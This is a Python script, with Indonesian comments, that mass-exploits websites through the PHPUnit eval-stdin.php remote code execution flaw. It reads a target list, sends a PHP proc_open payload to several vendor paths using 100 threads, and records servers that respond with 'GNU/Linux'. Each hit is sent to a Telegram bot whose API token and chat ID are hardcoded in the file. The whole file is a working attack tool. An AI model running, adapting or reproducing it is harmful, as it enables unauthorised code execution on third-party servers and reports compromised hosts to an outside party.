import os
import requests
import sys
import urllib3
from multiprocessing.dummy import Pool
from colorama import Fore, Style, init

# Inisialisasi Colorama
init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
clear = Style.RESET_ALL

# Buat folder hasil jika belum ada
def create_folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_folder('result')

# Disable warning SSL
urllib3.disable_warnings()

# Baca daftar target dari file
try:
    target_list = [i.strip() for i in open(sys.argv[1], 'r').readlines()]
except IndexError:
    print(f'\n  [!] Usage: python {sys.argv[0]} list.txt')
    sys.exit(1)

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
}

# === Telegram Configuration ===
TELEGRAM_API_TOKEN = "7842480126:AAHMGxk9z4VEA1JyHxYF4m2yKD29VWQgFhc"
TELEGRAM_CHAT_ID = "1002427506224"  # Replace with your chat ID

# Kirim pesan ke Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"{fr}[!] Telegram Error: {e}{clear}")

# Simpan hasil ke file + kirim ke Telegram
def save_result(url):
    with open("result/eval-stdin.txt", "a") as result_file:
        result_file.write(f"{url}\n")
    send_telegram_message(f"✅ <b>Vulnerable Found!</b>\n🔗 <code>{url}</code>")

# Fungsi eksploitasi
def exploit_site(url):
    paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"        
    ]
    protocols = ["http://", "https://"]
    methods = ["GET", "POST", "PUT"]
    
    payload = "<?php $sp2b9876 = proc_open('uname -a', array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'r')), $sp71a4e7); echo stream_get_contents($sp71a4e7[1]);?>"
    
    for protocol in protocols:
        full_url = protocol + url if not url.startswith(("http://", "https://")) else url
        
        for path in paths:
            for method in methods:
                try:
                    response = requests.request(
                        method=method,
                        url=full_url + path,
                        data=payload,
                        headers=headers,
                        timeout=15,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    if "GNU/Linux" in response.text:
                        print(f"{fg}Vulnerable --> {full_url + path} --> {method} [DONE]{clear}")
                        save_result(full_url + path)
                        return
                    else:
                        print(f"{fr}Not Vulnerable --> {full_url + path} --> {method}{clear}")
                except requests.exceptions.RequestException as e:
                    print(f"{fr}Error --> {full_url + path} --> {method} --> {str(e)}{clear}")

# Fungsi utama eksploitasi
def exploit(target):
    exploit_site(target)

# Main program
if __name__ == "__main__":
    print("|---------------------------|")
    print("|    CodeIgniter FINDER     |")
    print("|---------------------------|")
    
    pool = Pool(100)
    pool.map(exploit, target_list)
    pool.close()
    pool.join()
    
    print(fr + "|---------------------------------------------------------|")
    print(fr + "|             " + Fore.WHITE + "Done Scanning" + fr + "   |")
    print(fr + "|---------------------------------------------------------|")
